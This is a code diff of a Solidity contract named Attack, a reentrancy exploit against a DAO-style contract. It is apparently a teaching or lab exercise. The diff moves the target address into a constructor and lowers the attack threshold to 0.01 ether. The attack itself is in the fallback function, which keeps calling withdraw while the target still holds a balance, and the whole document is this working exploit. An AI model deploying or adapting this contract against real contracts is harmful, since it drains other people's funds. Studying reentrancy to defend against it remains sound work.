@@ -9,20 +9,22 @@ interface Dao_inf{
 }
 contract Attack{
     Dao_inf mydao; 
-    function depo(address _address) public payable {
-        // Seed the Dao with at least 0.1 Ether.
+
+    constructor(address _address){
         mydao = Dao_inf(_address);
-        require(msg.value >= 0.1 ether, "Need at least 0.1 ether to commence attack.");
+    }
+    function deposit() public payable {
+        // Seed the Dao with at least 0.1 Ether.
+        require(msg.value >= 0.01 ether, "Need at least 0.01 ether to commence attack.");
         mydao.deposit{value: msg.value}();
     }
-    function attack(address _address) public payable {
-        mydao = Dao_inf(_address);
+    function attack() public {
         // Withdraw from Dao.
         mydao.withdraw();
     }
 
     fallback() external payable{
-        if(mydao.daoBalance() >= 0.1 ether){
+        if(mydao.daoBalance() >= 0.01 ether){
             mydao.withdraw();
         }
     }
